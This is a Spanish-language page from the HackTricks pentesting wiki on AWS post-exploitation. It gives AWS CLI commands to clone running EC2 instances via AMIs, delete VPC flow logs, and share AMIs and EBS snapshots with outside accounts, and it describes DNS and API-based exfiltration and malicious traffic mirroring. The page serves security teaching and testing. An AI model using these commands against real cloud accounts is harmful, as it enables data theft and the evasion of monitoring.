# AWS - EC2, EBS, SSM y Post Explotaci√≥n de VPC

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, ¬°consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github.

</details>

## EC2 y VPC

Para obtener m√°s informaci√≥n, consulta:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **Espejo Malicioso de VPC**

El espejo de tr√°fico de VPC **duplica el tr√°fico de entrada y salida para las instancias EC2 dentro de una VPC** sin necesidad de instalar nada en las propias instancias. Este tr√°fico duplicado com√∫nmente se enviar√≠a a un sistema de detecci√≥n de intrusiones en la red (IDS) para su an√°lisis y monitoreo.\
Un atacante podr√≠a abusar de esto para capturar todo el tr√°fico y obtener informaci√≥n sensible de √©l:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Copiar Instancia en Ejecuci√≥n

Las instancias suelen contener alg√∫n tipo de informaci√≥n sensible. Hay diferentes formas de acceder a ellas (consulta [trucos de escalada de privilegios de EC2](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)). Sin embargo, otra forma de verificar lo que contiene es **crear una AMI y ejecutar una nueva instancia (incluso en tu propia cuenta) a partir de ella**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### Volcado de instant√°neas de EBS

**Las instant√°neas son copias de seguridad de los vol√∫menes**, que generalmente contienen **informaci√≥n sensible**, por lo tanto, al verificarlas se puede revelar esta informaci√≥n.\
Si encuentra un **volumen sin instant√°nea**, puede: **Crear una instant√°nea** y realizar las siguientes acciones o simplemente **montarlo en una instancia** dentro de la cuenta:

{% content-ref url="aws-ebs-spanshot-dump.md" %}
[aws-ebs-spanshot-dump.md](aws-ebs-spanshot-dump.md)
{% endcontent-ref %}

### Exfiltraci√≥n de datos

#### Exfiltraci√≥n a trav√©s de DNS

Incluso si bloquea un EC2 para que no se pueda enviar tr√°fico, a√∫n puede **exfiltrarse a trav√©s de DNS**.

* **Los registros de flujo de VPC no registrar√°n esto**.
* No tiene acceso a los registros de DNS de AWS.
*   Deshabilite esto configurando "enableDnsSupport" en falso con:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltraci√≥n a trav√©s de llamadas a la API

Un atacante podr√≠a llamar a los puntos finales de la API de una cuenta controlada por √©l. Cloudtrail registrar√° estas llamadas y el atacante podr√° ver los datos exfiltrados en los registros de Cloudtrail.

### Post Explotaci√≥n de SSM

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md" %}
[aws-ssm-post-exploitation.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-ssm-post-exploitation.md)
{% endcontent-ref %}

### Escalada de privilegios a ECS

Es posible ejecutar una instancia de EC2 y registrarla para que se use para ejecutar instancias de ECS y luego robar los datos de las instancias de ECS.

Para [**m√°s informaci√≥n, consulte esto**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Eliminar registros de flujo de VPC
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### Compartir AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### Compartir instant√°nea de EBS

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop).
* Obt√©n el [**merchandising oficial de PEASS y HackTricks**](https://peass.creator-spring.com).
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family).
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.

</details>
